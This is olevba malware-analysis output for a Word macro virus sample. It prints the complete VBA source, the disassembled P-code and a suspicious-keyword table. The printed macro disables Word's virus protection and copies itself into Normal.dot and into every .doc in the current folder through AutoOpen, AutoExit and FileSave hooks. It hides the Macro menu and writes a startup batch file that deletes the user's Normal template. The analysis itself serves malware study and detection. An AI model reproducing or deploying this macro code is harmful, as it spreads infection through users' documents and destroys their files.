olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.VMPC-based
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.VMPC-based - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MVG.bas 
in file: ./Virus.MSWord.VMPC-based - OLE stream: 'Macros/VBA/MVG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Skip As Integer
Sub MVG()
On Error Resume Next
Randomize
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents("MVG").Export "c:\MVG.sys"
ActiveDocument.ReadOnlyRecommended = False
check = Int(Rnd * 1000)
If check = 24 Then Call LanMVG
rm = Int(Rnd * 100)
    If rm = 99 Then MsgBox Chr(77) + Chr(86) + Chr(71), vbCritical
 f9517$ = "c:\windows\startm~1\programs\startup\msfile.bat"
aMVG = GetAttr(NormalTemplate.FullName)
If aMVG = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call zMVG(f9517$)
If aMVG = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call zMVG(f9517$)
If aMVG = vbReadOnly Then GoTo vMVG
If aMVG = vbReadOnly + vbArchive Then GoTo vMVG
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "MVG" Then bMVG = True
Next I
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "MVG" Then cMVG = True
Next I
If bMVG = True And cMVG = False Then Set dMVG = NormalTemplate.VBProject.VBComponents
If bMVG = False And cMVG = True Then Set dMVG = ActiveDocument.VBProject.VBComponents
dMVG.Import "c:\MVG.sys"
If bMVG = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If cMVG = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
f12939 = m12129 & c5225 & Int(Rnd * 7393)
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
vMVG:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox Chr(73) + Chr(78) + Chr(70) + Chr(69) + Chr(67) + Chr(84) + Chr(69) + Chr(68) + Chr(32) + Chr(49) + Chr(57) + Chr(57) + Chr(56) + Chr(32) + Chr(45) + Chr(32) + Chr(50) + Chr(48) + Chr(48) + Chr(48), vbInformation
    MsgBox Chr(66) + Chr(89) + Chr(32) + Chr(86) + Chr(73) + Chr(82) + Chr(85) + Chr(83), vbCritical
End Sub
Sub FileNew()
    On Error Resume Next
    Call MVG
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call MVG
End Sub
Sub FileSave()
    On Error Resume Next
    Call MVG
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call MVG
End Sub
Sub FileExit()
    On Error Resume Next
    Call MVG
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call MVG
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call MVG
End If
Loop
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call MVG
End Sub
Sub AutoExit()
    On Error Resume Next
    Call MVG
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call MVG
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call MVG
End If
Loop
End Sub
Sub ViewVBCode()
    On Error Resume Next
End Sub
Sub LanMVG()
    On Error Resume Next
       MsgBox ("Virii are cool?"), vbOKOnly
       MsgBox ("Got Metallica!"), vbQuestion
       MsgBox ("Way to go Norm!"), vbMsgBoxRight
       MsgBox ("Tic-Tac-Toe"), vbApplicationModal
       MsgBox ("Marry had a little lamb"), vbSystemModal
       MsgBox ("Boom! Ouch! Words now Sick :("), vbCritical
       MsgBox ("Got Milk?"), vbExclamation
       Selection.Text = Chr(76) + Chr(65) + Chr(78) + Chr(32) + Chr(77) + Chr(46) + Chr(86) + Chr(46) + Chr(71)
       If ActiveDocument.Saved = False Then ActiveDocument.Save
   End Sub
Sub zMVG(strFile As String)
Dim hFile As Long
On Error Resume Next
n$ = NormalTemplate
Part11$ = "attrib -h -r "
snag$ = "c:\progra~1\micros~1\templa~1\"
snag1$ = "c:\progra~1\micros~2\templa~1\"
Part2$ = "del "
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.VMPC-based
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/MVG - 8747 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn Skip (As Integer)
' Line #1:
' 	FuncDefn (Sub MVG())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	LitStr 0x000A "c:\MVG.sys"
' 	LitStr 0x0003 "MVG"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x03E8 
' 	Mul 
' 	FnInt 
' 	St check 
' Line #10:
' 	Ld check 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) LanMVG 0x0000 
' 	EndIf 
' Line #11:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	St rm 
' Line #12:
' 	Ld rm 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0047 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #13:
' 	LitStr 0x002F "c:\windows\startm~1\programs\startup\msfile.bat"
' 	St f9517$ 
' Line #14:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St aMVG 
' Line #15:
' 	Ld aMVG 
' 	Ld vbReadOnly 
' 	Eq 
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	And 
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	LitStr 0x0016 "English(United States)"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld f9517$ 
' 	ArgsCall (Call) zMVG 0x0001 
' 	EndIf 
' Line #16:
' 	Ld aMVG 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	And 
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	LitStr 0x0016 "English(United States)"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld f9517$ 
' 	ArgsCall (Call) zMVG 0x0001 
' 	EndIf 
' Line #17:
' 	Ld aMVG 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo vMVG 
' 	EndIf 
' Line #18:
' 	Ld aMVG 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo vMVG 
' 	EndIf 
' Line #19:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #20:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0003 "MVG"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St bMVG 
' 	EndIf 
' Line #21:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #22:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0003 "MVG"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St cMVG 
' 	EndIf 
' Line #24:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	Ld bMVG 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld cMVG 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dMVG 
' 	EndIf 
' Line #26:
' 	Ld bMVG 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld cMVG 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dMVG 
' 	EndIf 
' Line #27:
' 	LitStr 0x000A "c:\MVG.sys"
' 	Ld dMVG 
' 	ArgsMemCall Import 0x0001 
' Line #28:
' 	Ld bMVG 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Skip 
' 	LitDI2 0x0001 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #29:
' 	Ld cMVG 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' 	EndIf 
' Line #30:
' 	Ld m12129 
' 	Ld c5225 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x1CE1 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f12939 
' Line #31:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #32:
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #33:
' 	Label vMVG 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Sub HelpAbout())
' Line #36:
' 	OnError (Resume Next) 
' Line #37:
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0046 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0039 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0039 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0038 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' Line #38:
' 	LitDI2 0x0042 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub FileNew())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) MVG 0x0000 
' Line #43:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #44:
' 	LitDI2 0x0001 
' 	St Skip 
' Line #45:
' 	ArgsCall (Call) MVG 0x0000 
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Sub FileSave())
' Line #48:
' 	OnError (Resume Next) 
' Line #49:
' 	ArgsCall (Call) MVG 0x0000 
' Line #50:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub FileSaveAs())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #55:
' 	ArgsCall (Call) MVG 0x0000 
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Sub FileExit())
' Line #58:
' 	OnError (Resume Next) 
' Line #59:
' 	ArgsCall (Call) MVG 0x0000 
' Line #60:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #61:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #62:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #63:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #64:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' 	EndIf 
' Line #65:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #66:
' 	ArgsCall (Call) MVG 0x0000 
' Line #67:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #68:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #69:
' 	LineCont 0x0004 07 00 00 00
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #70:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #71:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #72:
' 	ArgsCall (Call) MVG 0x0000 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	Loop 
' Line #75:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #76:
' 	EndSub 
' Line #77:
' 	FuncDefn (Sub AutoOpen())
' Line #78:
' 	OnError (Resume Next) 
' Line #79:
' 	ArgsCall (Call) MVG 0x0000 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Sub AutoExit())
' Line #82:
' 	OnError (Resume Next) 
' Line #83:
' 	ArgsCall (Call) MVG 0x0000 
' Line #84:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #85:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #86:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #87:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' 	EndIf 
' Line #88:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #89:
' 	ArgsCall (Call) MVG 0x0000 
' Line #90:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #91:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #92:
' 	LineCont 0x0004 07 00 00 00
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #93:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #94:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #95:
' 	ArgsCall (Call) MVG 0x0000 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	Loop 
' Line #98:
' 	EndSub 
' Line #99:
' 	FuncDefn (Sub ViewVBCode())
' Line #100:
' 	OnError (Resume Next) 
' Line #101:
' 	EndSub 
' Line #102:
' 	FuncDefn (Sub LanMVG())
' Line #103:
' 	OnError (Resume Next) 
' Line #104:
' 	LitStr 0x000F "Virii are cool?"
' 	Paren 
' 	Ld vbOKOnly 
' 	ArgsCall MsgBox 0x0002 
' Line #105:
' 	LitStr 0x000E "Got Metallica!"
' 	Paren 
' 	Ld vbQuestion 
' 	ArgsCall MsgBox 0x0002 
' Line #106:
' 	LitStr 0x000F "Way to go Norm!"
' 	Paren 
' 	Ld vbMsgBoxRight 
' 	ArgsCall MsgBox 0x0002 
' Line #107:
' 	LitStr 0x000B "Tic-Tac-Toe"
' 	Paren 
' 	Ld vbApplicationModal 
' 	ArgsCall MsgBox 0x0002 
' Line #108:
' 	LitStr 0x0017 "Marry had a little lamb"
' 	Paren 
' 	Ld vbSystemModal 
' 	ArgsCall MsgBox 0x0002 
' Line #109:
' 	LitStr 0x001D "Boom! Ouch! Words now Sick :("
' 	Paren 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #110:
' 	LitStr 0x0009 "Got Milk?"
' 	Paren 
' 	Ld vbExclamation 
' 	ArgsCall MsgBox 0x0002 
' Line #111:
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0047 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Selection 
' 	MemSt Then 
' Line #112:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #113:
' 	EndSub 
' Line #114:
' 	FuncDefn (Sub zMVG(strFile As String))
' Line #115:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #116:
' 	OnError (Resume Next) 
' Line #117:
' 	Ld NormalTemplate 
' 	St n$ 
' Line #118:
' 	LitStr 0x000D "attrib -h -r "
' 	St Part11$ 
' Line #119:
' 	LitStr 0x001E "c:\progra~1\micros~1\templa~1\"
' 	St snag$ 
' Line #120:
' 	LitStr 0x001E "c:\progra~1\micros~2\templa~1\"
' 	St snag1$ 
' Line #121:
' 	LitStr 0x0004 "del "
' 	St Part2$ 
' Line #122:
' 	Ld Friend 
' 	St hFile 
' Line #123:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #124:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #125:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #126:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #127:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #128:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #129:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #130:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	LitStr 0x002F "c:\windows\startm~1\programs\startup\msfile.bat"
' 	Add 
' 	PrintItemNL 
' Line #131:
' 	Ld hFile 
' 	Close 0x0001 
' Line #132:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |msfile.bat          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

